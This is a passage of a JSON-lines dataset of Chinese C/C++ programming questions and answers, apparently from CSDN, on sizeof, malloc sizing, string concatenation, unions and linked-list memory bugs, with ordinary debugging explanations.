//初始化参数\n    Q->rear=0;\n    Q->maxsize=maxsize;\n}\n……………………\nint main()\n{\n    PQueue Open;\n    InitQueue(Open,10);\n    printf(\"OK\\n\");\n    Enqueue(Open,12);\n    QueueTraverse(Open);\n}\n"]], "Tag": "程序设计"}
{"Answer": "```\r\n#define STDC_WANT_LIB_EXT1 1\r\n#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\nint main(void)\r\n{\r\n    char preamble[] = \"the joke is:\\n\\n\";\r\n    char str[][40] =\r\n    {\r\n        \"My dog hasn\\'t got any nose.\\n\",\r\n        \"How does your dog smell then?\\n\",\r\n        \"My dog smells horrible.\\n\"\r\n    };\r\n    // 计算出str数组中的str个数，本程序中str值为3 \r\n    unsigned int strCount = sizeof(str)/sizeof(str[0]);\t\r\n    unsigned int length = 0;\r\n    // strnlen_s函数返回字串的长度 \r\n    for (unsigned int i = 0; i &lt; strCount ; ++i)\r\n        length += strnlen_s(str[i], sizeof(str[i]));\r\n\t\t\t// length为str数组中的字符串拼接后总长度 \r\n    char joke[length + strnlen_s(preamble, sizeof(preamble)) + 1];\r\n    \r\n    \r\n\t//  先strncpy_s函数拷贝，再strncat_s函数连接，作用区域都是joke \r\n    if (strncpy_s(joke, sizeof(joke), preamble, sizeof(preamble)))\r\n    {\r\n        printf(\"error copying preamble to joke.\\n\");\r\n        return 1;\r\n    }\r\n\r\n    for (unsigned int i = 0;  i &lt; strCount ;  ++i)\r\n    {\r\n        if (strncat_s(joke, sizeof(joke), str[i], sizeof(str[i])))\r\n        {\r\n            printf(\"error copying string str[%u].\", i);\r\n            return 2;\r\n        }\r\n\r\n    }\r\n    printf(\"%s\", joke);\r\n    return 0;\r\n} \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["以下字符串是怎么连接的,求解释", ["//program 6.4 joining strings", "\n#define ", "STDC_WANT_LIB_EXT1", " 1", "\n#include ", "\n#include ", "\nint main(void)", "\n{", "\n    char preamble[] = \"the joke is:\\n\\n\";", "\n    char str[][40] = {", "\n                    \"My dog hasn\\'t got any nose.\\n\",", "\n                    \"How does your dog smell then?\\n\",", "\n                    \"My dog smells horrible.\\n\"", "\n                    };", "\n\n", "unsigned int strCount = sizeof(str)/sizeof(str[0]);\nunsigned int length = 0;\nfor(unsigned int i = 0; i < strCount ; ++i)\n    length += strnlen_s(str[i], sizeof(str[i]));\nchar joke[length + strnlen_s(preamble, sizeof(preamble)) + 1];\n\nif(strncpy_s(joke, sizeof(joke), preamble, sizeof(preamble)))\n{\n    printf(\"error copying preamble to joke.\\n\");\n    return 1;\n}\n\nfor(unsigned int i = 0;  i < strCount ;  ++i)\n{\n    if(strncat_s(joke, sizeof(joke), str[i], sizeof(str[i])))\n    {\n        printf(\"error copying string str[%u].\", i);\n        return 2;\n    }\n\n}\n    printf(\"%s\", joke);\n        return 0;\n", "\n\n", "}", "\n这段代码到底是怎么组合字符的,搞了半天只看懂一点!", "\n        希望大神能给详细解释解释  (快到指针了,好激动)"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;强制类型转换&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;if&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;( (int)&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(int)&lt;/span&gt;&lt;/span&gt; &amp;gt; -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; )\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["问题sizeof（int）不能和-1比较吗", ["为什么答案是no，sizeof（int）不能和-1比较吗"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这是内存对齐的问题&amp;#xff0c;在64位系统中&amp;#xff0c;int 、float占4字节&amp;#xff0c;char占1字节&amp;#xff0c;str占30个字节。最大的为4字节&amp;#xff0c;所以每个元素的内存实际占用为4的倍数&amp;#xff0c;30不是4的倍数&amp;#xff0c;扩展到32正好是4的倍数&amp;#xff0c;所以就占32个字节了。如果你的union是这样的&amp;#xff1a;&lt;br /&gt;union Data&lt;br /&gt;{&lt;!-- --&gt;&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;   char  str[30];&lt;/span&gt;&lt;br /&gt;};&lt;br /&gt;那么占据的就是30个字节了&amp;#xff0c;因为只有char型&amp;#xff08;char只占1个字节&amp;#xff09;&amp;#xff0c;30是1的整数倍。&lt;br /&gt;关于这方面我之前写过一篇关于内存对齐的&amp;#xff0c;需要的话&amp;#xff0c;请查看&amp;#xff1a;&lt;a href=\"https://blog.csdn.net/qq_43516928/article/details/119680760?ops_request_misc&amp;#61;%257B%2522request%255Fid%2522%253A%2522165259434316782391891943%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;amp;request_id&amp;#61;165259434316782391891943&amp;amp;biz_id&amp;#61;0&amp;amp;utm_medium&amp;#61;distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-119680760-null-null.nonecase&amp;amp;utm_term&amp;#61;%E5%86%85%E5%AD%98&amp;amp;spm&amp;#61;1018.2226.3001.4450\" id=\"textarea_1652593793380_1652594357613_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://blog.csdn.net/qq_43516928/article/details/119680760?ops_request_misc&amp;#61;%257B%2522request%255Fid%2522%253A%2522165259434316782391891943%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;amp;request_id&amp;#61;165259434316782391891943&amp;amp;biz_id&amp;#61;0&amp;amp;utm_medium&amp;#61;distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-119680760-null-null.nonecase&amp;amp;utm_term&amp;#61;%E5%86%85%E5%AD%98&amp;amp;spm&amp;#61;1018.2226.3001.4450&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["下面得出的共用体变量的内存大小为什么是32，不是30；", ["\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<string.h>", "\n \n", "union", " ", "Data", "\n{\n   ", "int", " i;\n   ", "float", " f;\n   ", "char", "  str[", "30", "];\n};\n \n", "int", " ", "main", "( )", "\n", "{\n   ", "union", " ", "Data", " data;        \n \n   ", "printf", "( ", "\"Memory size occupied by data : %d\\n\"", ", ", "sizeof", "(data));", "//输出 32", "\n \n   ", "return", " ", "0", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组访问越界了&amp;#xff0c;36行分配了lenth长度的内存空间&amp;#xff0c;而strcpy_s(*(pword &amp;#43; i), 100, temp[i]); 里设置的最大长度是100&amp;#xff0c;也就是目标数组长度小于100&amp;#xff0c;结果无法预测&amp;#xff0c;可能会造成缓冲区溢出。&lt;br /&gt;所以要么改成&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;*(pword &amp;#43; i) &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;));\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;要么改成&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;strcpy&lt;span class=\"hljs-constructor\"&gt;_s(&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;pword&lt;/span&gt; &amp;#43; &lt;span class=\"hljs-params\"&gt;i&lt;/span&gt;)&lt;/span&gt;, lenth, temp&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt;);\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["动态内存分配和释放问题！", ["释放的时候出现了堆损坏 这是为啥？", "\n", "\n```c\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<string.h>", "\n", "#", "include", " ", "<float.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<limits.h>", "\n", "#", "include", " ", "<math.h>", "\n", "#", "include", " ", "<string.h>", "\n", "#", "include", " ", "<ctype.h>", "\n", "#", "include", " ", "<time.h>", "\n", "#", "include", " ", "<stdbool.h>", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "int", " ", "main", "(", "void", ")", "\n", "{\n    ", "int", " cnt = ", "0", ";\n    ", "puts", "(", "\"你要输入几个单词？\"", ");\n    ", "scanf_s", "(", "\"%d\"", ", &cnt);\n    ", "char", " ch = ", "getchar", "();\n    ", "char", "** pword = (", "char", "**)", "malloc", "(cnt * ", "sizeof", "(", "char", "*));\n    ", "char", "* ptr = ", "NULL", ";\n    ", "if", " (!pword)\n    {\n        ", "puts", "(", "\"分配失败\"", ");\n        ", "return", " ", "NULL", ";\n    }\n    ", "char", " temp[", "5", "][", "100", "];\n    ", "size_t", " lenth = ", "0", ";\n    ", "for", " (", "int", " i = ", "0", "; i < cnt; i++)\n    {\n        ", "gets_s", "(temp[i], ", "100", ");\n        lenth = ", "strnlen", "(temp[i], ", "100", ") + ", "1", ";\n        ", "printf_s", "(", "\"%d>>%zd \\n\"", ", i, lenth);\n        *(pword + i) = (", "char", "*)", "malloc", "(lenth * ", "sizeof", "(", "char", "));\n        ", "printf_s", "(", "\"%p >>%p \\n\"", ", *(pword + i), temp[i]);\n        ", "strcpy_s", "(*(pword + i), ", "100", ", temp[i]);\n        ", "printf_s", "(", "\"%p >>%p \\n\"", ", *(pword + i), temp[i]);\n    }\n    ", "for", " (", "int", " i = ", "0", "; i < cnt; i++)\n    {\n        ", "free", "(*(pword + i));\n    }\n    ", "free", "(pword);\n    \n    ", "return", " ", "0", ";\n\n}\n\n![img](https:", "//img-mid.csdnimg.cn/release/static/image/mid/ask/802013694156152.png \"#left\")", "\n\n\n\n", "\n", "```"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;把a &amp;#61; (stu1)malloc(sizeof(stu));改为a &amp;#61; new stu;就可以了。malloc只是分配内存&amp;#xff0c;sizeof无法计算string的内存大小&amp;#xff0c;不能分配有效空间。&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;#include&amp;lt;iostream&amp;gt;\n#include&amp;lt;string&amp;gt;\n#include&amp;lt;stdio.h&amp;gt;\nusing namespace std;\t//结构体\ntypedef struct student {\n\tint score;\n\tstring id;\n\tstring name;\n}stu,*stu1;\n \nint main()\n{\n\tstu1 a &amp;#61; new stu;\n\tif (a &amp;#61;&amp;#61; NULL) \n\t{\n\t\tcout &amp;lt;&amp;lt; &amp;#34;error&amp;#34;;\n\t\texit(0);\n\t}\n\ta-&amp;gt;score &amp;#61; 60;\n\ta-&amp;gt;id &amp;#61; &amp;#34;201743303117&amp;#34;;\n\ta-&amp;gt;name &amp;#61; &amp;#34;weilifeng&amp;#34;;\n\tcout &amp;lt;&amp;lt; a-&amp;gt;name &amp;lt;&amp;lt; &amp;#34; &amp;#34; &amp;lt;&amp;lt; a-&amp;gt;id &amp;lt;&amp;lt; &amp;#34; &amp;#34; &amp;lt;&amp;lt; a-&amp;gt;score &amp;lt;&amp;lt; endl;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++结构体申请内存空间出现问题 有可能是string的问题", ["\n", "#include<iostream>\n#include<string>\n#include<stdio.h>\nusing namespace std;\t//结构体\n\ntypedef struct student {\n\tint score;\n\tstring id;\n\tstring name;\n}stu,*stu1;\n\n\nint main()\n{\n\t/*stu s;\n\ts.name = \"weilifeng\";\n\ts.id = \"201743303117\";\n\ts.score = 60;\n\tcout << s.name << \" \" << s.id << \" \" << s.score << endl;*/ \n    //上面注释的代码可以运行\n\n\n\n    //我想通过指针申请内存空间 ，然后再进行赋值，不报错，但运行不了\n    //我大概觉得可能是越界的问题。但是问题出在哪里不知道  求解答\n\tstu1 a;\n\ta = (stu1)malloc(sizeof(stu));\n\tif (a == NULL) \n\t{\n\t\tcout << \"error\";\n\t\texit(0);\n\t}\n\ta->score = 60;\n\ta->id = \"201743303117\";\n\ta->name = \"weilifeng\";\n\tcout << a->name << \" \" << a->id << \" \" << a->score << endl;\n}", "\n\n", "通过断点，调试出来的问题   出现在 这句", "\n\n", "\n", "a->id = \"201743303117\";", "\n\n", "下面是报错的反馈", "\n\n", "\n", "0x00007FFB517113D6 (vcruntime140d.dll)处(位于 Project1.exe 中)引发的异常: 0xC0000005: 读取位置 0xFFFFFFFFFFFFFFFF 时发生访问冲突。", "\n\n", "\n "]], "Tag": "程序设计"}
{"Answer": "https://blog.csdn.net/qq_38987374/article/details/79110603", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["hdoj 1043 八数码已编码 Time Limit Exceeded", ["#include", "\n#include", "\n#include", "\n#include", "\nusing namespace std;", "\ntypedef int state[9];", "\nconst int maxstate=1000000;", "\nstate st[maxstate],goal={1,2,3,4,5,6,7,8,0};", "\nint dist[maxstate];", "\nchar record[maxstate];  //前一个状态到这一个的移动", "\nint father[maxstate];//记录夫节点配合record【】", "\nint vis[362880];", "\nint fact[9];", "\nconst int dx[4]={-1,1,0,0};", "\nconst int dy[4]={0,0,-1,1};", "\nconst char dir[4]={'u','d','l','r'};", "\nvoid init_lookup_table()", "\n{", "\n    fact[0]=1;", "\n    for(int i=1;i\n        fact[i]=fact[i-1]*i;", "\n}", "\nint try_to_insert(int s)   //编码", "\n{", "\n    int code=0;", "\n    for(int i=0;i\n    {", "\n        int cnt=0;", "\n        for(int j=i+1;j\n            if(st[s][j]\n                cnt++;", "\n        code+=fact[8-i]*cnt;", "\n    }", "\n    if(vis[code]) return 0;", "\n    return vis[code]=1;", "\n}", "\nint bfs()", "\n{", "\n    init_lookup_table();", "\n    int front=1,rear=2;", "\n    while(front\n    {", "\n        state& s=st[front];", "\n        if(memcmp(goal,s,sizeof(s))==0) return front;", "\n        int z;", "\n        for(z=0;z\n            if(!s[z])", "\n                break;", "\n        int x=z/3,y=z%3;", "\n        for(int d=0;d\n        {", "\n            int newx=x+dx[d];", "\n            int newy=y+dy[d];", "\n            int newz=newx*3+newy;", "\n            if(newx>=0&&newx=0&&newy\n            {", "\n                state& t=st[rear];", "\n                memcpy(&t,&s,sizeof(s));", "\n                t[newz]=s[z];", "\n                t[z]=s[newz];", "\n                dist[rear]=dist[front]+1;", "\n                if(try_to_insert(rear))   //如果这个状态未被访问", "\n                {", "\n                    father[rear]=front;", "\n                    record[rear]=dir[d];", "\n                    rear++;", "\n                }", "\n            }", "\n        }", "\n        front++;", "\n    }", "\n    return 0;", "\n}", "\nint main(void)", "\n{", "\n    char ch[100];", "\n    int index;", "\n    while(gets(ch)!=NULL)    //输入", "\n    {", "\n        index=0;", "\n        memset(vis,0,sizeof(vis));", "\n        memset(dist,0,sizeof(dist));", "\n        for(int i=0;i\n        {", "\n            if(ch[i]>='0'&&ch[i]<='9')", "\n                st[1][index++]=ch[i]-'0';", "\n            else if(ch[i]=='x')", "\n                st[1][index++]=0;", "\n        }", "\n        int ans=bfs();", "\n        if(ans>0)", "\n        {", "\n            string str;", "\n            int v=ans;", "\n            int k=dist[ans];", "\n            while(k--)", "\n            {", "\n                str.push_back(record[v]);  //路径生成", "\n                v=father[v];", "\n            }", "\n            for(int i=str.length()-1;i>=0;i--)", "\n                printf(\"%c\",str[i]);", "\n            printf(\"\\n\");", "\n        }", "\n        else", "\n            printf(\"unsolvable\\n\");", "\n    }", "\n    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "free出错是因为你malloc的时候申请的空间不对。\r\nlpHead = current = prev = (LPNODE)malloc(sizeof(LPNODE));以及current = (LPNODE)malloc(sizeof(LPNODE));不对\r\n因为你sizeof(LPNODE)相当于sizeof(指针)，在32位机上永远是4\r\n你typedef的时候应该多取一个名字，假设叫LPLEN，然后应该改成(LPNODE)malloc(sizeof(LPLEN));\r\n\r\n```\r\n #include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n\r\n\r\ntypedef struct node{\r\n\tint data;\r\n\tstruct node *next;\r\n}*LPNODE,LPLEN;\r\n\r\nLPNODE CreateList(int n);\r\nvoid ShowList(LPNODE lphead);\r\n\r\nint main(void)\r\n{\r\n\tLPNODE lpHead, temp, current;\r\n\tint num;\r\n\r\n\tputs(\"请问您需要几个节点？\");\r\n\tscanf_s(\"%d\", &amp;num);\r\n\tlpHead = CreateList(num);\r\n\tShowList(lpHead);\r\n\r\n\t//释放链表\r\n\tcurrent = lpHead;\r\n\twhile (current != NULL)\r\n\t{\r\n\t\ttemp = current-&gt;next;\r\n\t\tfree(current);\r\n\t\tcurrent = temp;\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n\r\nLPNODE CreateList(int n)\r\n{\r\n\tint _data, count = 0;\r\n\tLPNODE lpHead = NULL;\r\n\tLPNODE current, prev;\r\n\r\n\tlpHead = current = prev = (LPNODE)malloc(sizeof(LPLEN));\r\n\r\n\tputs(\"请输入一个数字：\");\r\n\twhile (scanf_s(\"%d\", &amp;_data))\r\n\t{\r\n\t\tcurrent = (LPNODE)malloc(sizeof(LPLEN));\r\n\r\n\r\n\t\tprev-&gt;next = current;\r\n\r\n\t\tcurrent-&gt;data = _data;\r\n\t\tcurrent-&gt;next = NULL;\r\n\r\n\t\tprev = current;\r\n\r\n\t\tcount++;    //控制循环\r\n\t\tif (count &lt; n)\r\n\t\t\tputs(\"请输入下一个数字\");\r\n\t\telse\r\n\t\t{\r\n\t\t\tputs(\"输入结束！\");\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\treturn lpHead;\r\n}\r\n\r\nvoid ShowList(LPNODE lpHead)\r\n{\r\n\tLPNODE p = lpHead-&gt;next;\r\n\r\n\twhile (p != NULL)\r\n\t{\r\n\t\tprintf(\"%d  \", p-&gt;data);\r\n\t\tp = p-&gt;next;\r\n\t}\r\n}\r\n\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么我这【链表】 内存释放不了？", ["程序可以运行，可以输入，可以输出，但是到了释放内存的时候就有问题了  求大神指正。", "\n\n", " #include <stdio.h>\n #include <stdlib.h>\n\n\ntypedef struct node{\n    int data;\n    struct node *next;\n}*LPNODE;\n\nLPNODE CreateList(int n);\nvoid ShowList(LPNODE lphead);\n\nint main(void)\n{\n    LPNODE lpHead, temp, current;\n    int num;\n\n    puts(\"请问您需要几个节点？\");\n    scanf_s(\"%d\", &num);\n    lpHead = CreateList(num);\n    ShowList(lpHead);\n\n    //释放链表\n    current = lpHead;       \n    while (current != NULL)\n    {\n        temp = current->next;\n        free(current);\n        current = temp;\n    }\n\n    return 0;\n}\n\nLPNODE CreateList(int n)\n{\n    int _data, count = 0;\n    LPNODE lpHead = NULL;\n    LPNODE current, prev;\n\n    lpHead = current = prev = (LPNODE)malloc(sizeof(LPNODE));\n\n    puts(\"请输入一个数字：\");\n    while (scanf_s(\"%d\", &_data))\n    {\n        current = (LPNODE)malloc(sizeof(LPNODE));\n\n\n        prev->next = current;\n\n        current->data = _data;\n        current->next = NULL;\n\n        prev = current;\n\n        count++;    //控制循环\n        if (count < n)\n            puts(\"请输入下一个数字\");\n        else\n        {\n            puts(\"输入结束！\");\n            break;\n        }\n    }\n    return lpHead;\n}\n\nvoid ShowList(LPNODE lpHead)\n{\n    LPNODE p = lpHead->next;\n\n    while (p != NULL)\n    {\n        printf(\"%d  \", p->data);\n        p = p->next;\n    }\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你的isEmpty实现不对, 可以return ls-&amp;gt;len &amp;#61;&amp;#61; 0;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么pop没有让链栈出栈，我有ls->top=(ls->top)->next; 呀？？？", ["\n", "#include<stdio.h>\n#include<conio.h>\n#include<stdlib.h>\n#include<string.h>\ntypedef int T; //数据元素类型\nstruct LNode {\n    T data;\n    LNode* next;\n};\n\nstruct LinkStack {\n    LNode* top; // 栈顶指针\n    int len; // 栈的长度\n};\nLinkStack* LS_Create()\n{\n    LinkStack* ls=(LinkStack*)malloc(sizeof(LinkStack));\n    ls->top = NULL;\n    ls->len = 0;\n    return ls;\n}\n\n/*释放栈*/\nvoid LS_Free(LinkStack* ls)\n{\n    LNode* curr = ls->top;\n    while(curr) {\n        LNode* next = curr->next;\n        free(curr);\n        curr=next;\n    }\n    free(ls);\n}\n\n/*将栈变为空栈*/\nvoid LS_MakeEmpty(LinkStack* ls)\n{\n    LNode* curr = ls->top;\n    while(curr) {\n        LNode* next = curr->next;\n        free(curr);\n        curr=next;\n    }\n    ls->top = NULL;\n    ls->len = 0;\n}\n\n/*判断栈是否为空*/\nbool LS_IsEmpty(LinkStack* ls)\n{\n    // 请在这里补充代码，完成本关任务\n    /********** Begin *********/\n    return ls->len;\n\n    /********** End **********/\n}\n\n/*获取栈的长度*/\nint LS_Length(LinkStack* ls)\n{\n    // 请在这里补充代码，完成本关任务\n    /********** Begin *********/\n    return ls->len-1;\n\n    /********** End **********/\n}\n\n/*将x进栈*/\nvoid LS_Push(LinkStack* ls, T x)\n{\n    // 请在这里补充代码，完成本关任务\n    /********** Begin *********/\n    LNode *s=(LNode*)malloc(sizeof(LNode));\n    s->data=x;\n    s->next=ls->top;\n    ls->top=s;\n    ls->len++;\n\n    /********** End **********/\n}\n\n/*出栈。出栈元素放入item；如果空栈，将返回false*/\nbool LS_Pop(LinkStack* ls, T& item)\n{\n    // 请在这里补充代码，完成本关任务\n    /********** Begin *********/\n    if(LS_IsEmpty(ls))\n    return false;\n    item=ls->top->data;    \n    ls->top=(ls->top)->next;        //就是这里，我明明让top指向下一个LNode呀\n    ls->len--;\n    return true;\n    /********** End **********/\n}\n\n/*读栈顶元素放入item。如果空栈，将返回false*/\nbool LS_Top(LinkStack* ls, T& item)\n{\n    // 请在这里补充代码，完成本关任务\n    /********** Begin *********/\nif(LS_IsEmpty(ls))\n    return false;\n    item=ls->top->data;\n    return true;\n    /********** End **********/\n}\n\n/*从栈顶到栈底打印各结点数据*/\nvoid LS_Print(LinkStack* ls)\n{\n    if (ls->len==0){ \n        printf(\"The stack: Empty!\");\n        return;\n    }\n    printf(\"The stack (from top to bottom):\");\n    LNode* curr=ls->top;\n    while(curr) {\n        printf(\" %d\", curr->data);\n         \n        curr=curr->next;\n    }\n   // printf(\"\\n\");\n}\n\nint main()\n{\n    LinkStack* ls=LS_Create();\n    char dowhat[100];\n    while(true) {\n        scanf(\"%s\", dowhat);\n        if (!strcmp(dowhat,\"push\")) {\n            T x;\n            scanf(\"%d\", &x);\n            LS_Push(ls,x);\n        }else if (!strcmp(dowhat,\"pop\")) {\n            T item;\n            LS_Pop(ls, item);\n\t\t}\n        else {\n            break;\n        }\n    }\n    int length=LS_Length(ls);\n    printf(\"Stack length: %d\\n\", length);\n\t\n    LS_Print(ls);getch();\n    LS_Free(ls);\n}", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;我在Dev-C&amp;#43;&amp;#43;里测试的&amp;#xff0c;下面是我的回答&amp;#xff0c;供参考&amp;#xff1a;&lt;br /&gt;sizeof(dest)返回的是dest定义时数组的长度&amp;#xff1a;50。&lt;br /&gt;如果需要输出追加后的整个字符串就把i &amp;lt;sizeof(dest)/sizeof(char)-1 改为i&amp;lt;strlen(dest)就可以了&amp;#xff0c;输出“stingold”.&lt;br /&gt;如果要输出old把for循环改为&amp;#xff1a;for(i&amp;#61;6;i &amp;lt;strlen(dest);i&amp;#43;&amp;#43;) 就可以了&amp;#xff0c;输出“old” .&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["函数的返回值是一个字符数组的指针，通过这个指针的值遍历数组，使用sizeof(数组名）得到的是变化之前的数组元素个数？", ["\n", " #include <stdio.h>", "#include <string.h>", "\n", "int main ()", "{", "   char src[50], dest[50];", "\n", "   strcpy(src,  \"old\");//赋值后面的字符串给前面的字符数组", "   strcpy(dest, \"string\");", "\n", "   char *p = (char *) strcat(dest, src);//将后面的字符数组对应字符串追加到前面", "\n", "   printf(\"最终的目标字符串：\");//这个地方我不用%s直接打印出字符串，我想用strcat返回的字符类型指针", "   int i =0;", "   for(;i <sizeof(dest)/sizeof(char)-1;i++)//减去1是为了不打印最后一个'\\0'", "   {", "      printf(\"%c\",p[i]);", "   }", "   printf(\"/n\");", "   return(0);", "}", "\n", "最终的目标字符串： old", "\n", "显然使用sizeof求出的还是第一次赋值后的字符串的长度；", "\n", "我想要用遍历字符的方法输出追加后的字符串"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;如果你的进程退出&amp;#xff0c;所有属于该进程的空间都会释放。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["顺序表的动态分配中malloc申请来的空间最后编译器会自动释放吗", ["我做了一个顺序表，动态申请了一片内存空间", "\n\n", "\n", "#include<stdio.h>\n#include<stdlib.h>   //malloc \n#define initsize 10\ntypedef struct list{\n\tint *data;\n\tint maxsize;\n\tint length;\n}seqlist;\n\nvoid initlist(seqlist *p){    \n\t(*p).length=0;\n\t(*p).maxsize=initsize;\n\t(*p).data=(int *)malloc(initsize*sizeof(int));\n\tint i;\n\tfor(i=0;i<initsize;i++){    \n\t\t(*p).data[i]=0;          \n\t} \n}\nint main()\n{\n\tseqlist l;\n\tinitlist(&l);\n\tfree(l.data);\n\treturn 0;\n}", "\n\n", "我想知道如果我不在最后free（l.data）dev c的编译器能否自动帮我释放malloc申请来的空间", "\n\n", "麻烦老师们给我解答一下疑惑，谢谢"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;comp&lt;/span&gt;  &lt;span class=\"hljs-comment\"&gt;//复数comp有两个成员&amp;#xff1a;实部re和虚部im&lt;/span&gt;\n{\n    &lt;span class=\"hljs-type\"&gt;float&lt;/span&gt; re;\n    &lt;span class=\"hljs-type\"&gt;float&lt;/span&gt; im;\n};\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;comp&lt;/span&gt;* &lt;span class=\"hljs-built_in\"&gt;m&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; comp* x, &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; comp* y) &lt;span class=\"hljs-comment\"&gt;//函数功能为求两个复数的差&lt;/span&gt;\n\n{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;comp&lt;/span&gt; *z; &lt;span class=\"hljs-comment\"&gt;//定义复数指针z&lt;/span&gt;\n    z &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; comp*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; comp)); &lt;span class=\"hljs-comment\"&gt;//为指针z分配空间&lt;/span&gt;\n    z-&amp;gt;re &amp;#61; x-&amp;gt;re - y-&amp;gt;im; &lt;span class=\"hljs-comment\"&gt;//z的实部等于x的实部减y的实部&lt;/span&gt;\n    z-&amp;gt;im &amp;#61; x-&amp;gt;im - y-&amp;gt;re; &lt;span class=\"hljs-comment\"&gt;//z的虚部等于x的虚部减y的虚部&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt;(z);\n}\n&lt;span class=\"hljs-built_in\"&gt;main&lt;/span&gt;()\n{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;comp&lt;/span&gt;* t;\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;comp&lt;/span&gt; a, b;\n    a.re &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;   a.im &amp;#61; &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;;\n    b.re &amp;#61; &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;;   b.im &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;;\n    t &amp;#61; &lt;span class=\"hljs-built_in\"&gt;m&lt;/span&gt;(&amp;amp;a, &amp;amp;b); &lt;span class=\"hljs-comment\"&gt;//调用函数m求a与b的差&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;z.re&amp;#61;%5.2f, z.im&amp;#61;%5.2f&amp;#34;&lt;/span&gt;, t-&amp;gt;re, t-&amp;gt;im);\n    &lt;span 